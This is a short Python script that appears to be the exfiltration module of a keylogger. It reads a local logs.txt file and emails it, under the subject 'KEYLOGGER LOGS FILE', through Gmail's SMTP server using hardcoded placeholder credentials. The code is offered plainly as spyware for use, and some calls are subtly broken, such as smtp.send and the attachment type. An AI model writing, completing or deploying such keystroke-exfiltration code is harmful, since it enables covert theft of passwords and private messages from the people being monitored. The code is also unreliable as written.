from email.message import EmailMessage
from getpass import getpass
import smtplib
import os

EMAIL_ADDRESS = 'useremail@email.com'  # place your email here - use environment variable.
EMAIL_PASSWORD = 'Strong_password@001010!'  # place your password here - use environment variable.

def send_email():
    # template format for sent email
    message = EmailMessage()
    message["Subject"] = 'KEYLOGGER LOGS FILE'
    message["From"] = EMAIL_ADDRESS   # sender
    message["To"] = EMAIL_ADDRESS   # receiver
    message.set_content('Logs file (document) attached  ...')

    with open('logs.txt', 'rb') as f:
        file_data = f.read()
        file_name, file_extension = os.path.splitext('logs.txt')

    message.add_attachment(file_data, maintype='txt', subtype=file_extension, filename=file_name)

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(user=EMAIL_ADDRESS, password=EMAIL_PASSWORD)
        smtp.send(message)
